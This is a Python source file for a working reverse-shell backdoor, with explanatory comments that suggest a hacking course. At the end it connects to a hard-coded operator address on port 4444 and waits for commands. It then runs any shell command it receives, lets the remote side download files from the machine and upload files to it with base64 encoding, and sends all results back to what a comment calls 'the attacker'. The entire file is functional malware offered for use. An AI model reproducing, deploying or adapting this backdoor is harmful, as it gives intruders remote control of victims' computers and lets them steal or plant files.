#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        # create a socket object (an instance of the connection)
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect to our target with this socket object
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        # convert data as json
        json_data = json.dumps(data)
        # send data as json
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                # receive data as json
                json_data = json_data + self.connection.recv(1024)
                # convert-unrap data back from json
                return json.loads(json_data)
            except ValueError:
                continue

    # this function is to return the result of system command
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful. "

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        # execute these commands in a loop to be able to send commands continuously
        while True:
            # receive data in a variable named command
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    # pass this command variable to a function named execute_system_command
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = "[-] Error during command execution"
            # print(command_result)  to see that the base64 converts the file into known parsable characters
            # send the result to the attacker
            self.reliable_send(command_result)


# create an instance of the object and run the class
my_backdoor = Backdoor("192.168.1.7", 4444)
my_backdoor.run()
